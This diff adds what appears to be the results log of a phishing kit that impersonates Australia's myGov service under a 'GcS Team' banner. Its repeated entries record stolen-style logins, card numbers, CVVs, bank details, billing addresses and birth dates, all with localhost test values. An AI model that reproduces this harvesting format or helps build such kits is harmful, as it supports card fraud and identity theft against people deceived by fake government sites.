@@ -1,0 +1,188 @@
+::1  -  2022-12-29 @ 08:04:36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : test123@test.com
+|Password      : test1234again
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : test name
+|[💳 CC Number]      : 4563 1235 7890 9876
+|[🔄 Expiry Date ]      : 12/23
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : BANK OF OVERSEAS CHINESE
+|Card Type           : CREDIT
+|Card Brand          : TRADITIONAL
+|Card Country           : Taiwan, Province of China[a]
+|Bank Scheme          : VISA
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:05:23
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : test123@test.com
+|Password      : test1234again
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : test name
+|[💳 CC Number]      : 4563 1235 7890 9876
+|[🔄 Expiry Date ]      : 12/23
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : BANK OF OVERSEAS CHINESE
+|Card Type           : CREDIT
+|Card Brand          : TRADITIONAL
+|Card Country           : Taiwan, Province of China[a]
+|Bank Scheme          : VISA
+[+]━━━━【[📓] Billing INFO】━━━━[+]
+|First name          : test
+|Last name          : name
+|Address 1 [📓]          : address 1
+|Address 2 [📓]          : adddress 2
+|City 🌃           : city
+|State 🌃           : state
+|Zip code 🌃          : postcode
+|Phone number 📞           : 98734567829
+|Date of birthday 🎂        : 12121965
+[+]━━━━【💻 System INFO】━━━━[+]
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:12:06
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : newtest@newtester.com
+|Password      : newtester
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : new tester
+|[💳 CC Number]      : 4567 8912 3456 6778
+|[🔄 Expiry Date ]      : 12/34
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : BANCO COMERCIAL DE MANABI, S.A.
+|Card Type           : CREDIT
+|Card Brand          : TRADITIONAL
+|Card Country           : Ecuador
+|Bank Scheme          : VISA
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:12:49
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : newtest@newtester.com
+|Password      : newtester
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : new tester
+|[💳 CC Number]      : 4567 8912 3456 6778
+|[🔄 Expiry Date ]      : 12/34
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : BANCO COMERCIAL DE MANABI, S.A.
+|Card Type           : CREDIT
+|Card Brand          : TRADITIONAL
+|Card Country           : Ecuador
+|Bank Scheme          : VISA
+[+]━━━━【[📓] Billing INFO】━━━━[+]
+|First name          : john
+|Last name          : does
+|Address 1 [📓]          : address
+|Address 2 [📓]          : address1
+|City 🌃           : city
+|State 🌃           : states
+|Zip code 🌃          : 2345
+|Phone number 📞           : 877789788
+|Date of birthday 🎂        : 12231890
+[+]━━━━【💻 System INFO】━━━━[+]
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:15:48
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : newtester3@tester3.com
+|Password      : tster23
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : three three
+|[💳 CC Number]      : 4672 8999 0983 6473
+|[🔄 Expiry Date ]      : 12/34
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : MERCANTILE BANK, N.A.
+|Card Type           : CREDIT
+|Card Brand          : BUSINESS
+|Card Country           : United States of America
+|Bank Scheme          : VISA
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:16:18
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : newtester3@tester3.com
+|Password      : tster23
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : three three
+|[💳 CC Number]      : 4672 8999 0983 6473
+|[🔄 Expiry Date ]      : 12/34
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : MERCANTILE BANK, N.A.
+|Card Type           : CREDIT
+|Card Brand          : BUSINESS
+|Card Country           : United States of America
+|Bank Scheme          : VISA
+[+]━━━━【[📓] Billing INFO】━━━━[+]
+|First name          : three
+|Last name          : three
+|Address 1 [📓]          : address
+|Address 2 [📓]          : address2
+|City 🌃           : city
+|State 🌃           : state
+|Zip code 🌃          : post
+|Phone number 📞           : 6788798999
+|Date of birthday 🎂        : 121234
+[+]━━━━【💻 System INFO】━━━━[+]
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:22:51
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : testfourfour@four.com
+|Password      : fourfourty
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : four
+|[💳 CC Number]      : 5637 2891 0037 3782
+|[🔄 Expiry Date ]      : 12/32
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : 
+|Card Type           : 
+|Card Brand          : 
+|Card Country           : 
+|Bank Scheme          : 
+[+]━━━━【💻 System INFO】━━━━[+]
+UserAgent  :  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+::1  -  2022-12-29 @ 08:23:35
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
+[+]━━━━【🔑 Account Login 】━━━━[+]
+|Email or Phone      : testfourfour@four.com
+|Password      : fourfourty
+[+]━━━━【💳 CC INFO】━━━━[+]
+|Card holder      : four
+|[💳 CC Number]      : 5637 2891 0037 3782
+|[🔄 Expiry Date ]      : 12/32
+|[🔑 (CVV)]      : 123
+[+]━━━━【🏦 Bank INFO】━━━━[+]
+|Bank Name          : 
+|Card Type           : 
+|Card Brand          : 
+|Card Country           : 
+|Bank Scheme          : 
+[+]━━━━【[📓] Billing INFO】━━━━[+]
+|First name          : four
+|Last name          : four
+|Address 1 [📓]          : adress 1
+|Address 2 [📓]          : address2
+|City 🌃           : city
+|State 🌃           : state
+|Zip code 🌃          : post
+|Phone number 📞           : 1234676737
+|Date of birthday 🎂        : 121221
+[+]━━━━【💻 System INFO】━━━━[+]
+[GcS Team🇩🇿][+]━━━━【🇦🇺 Mygov Logs 🇦🇺】━━━━[+][GcS Team🇩🇿]
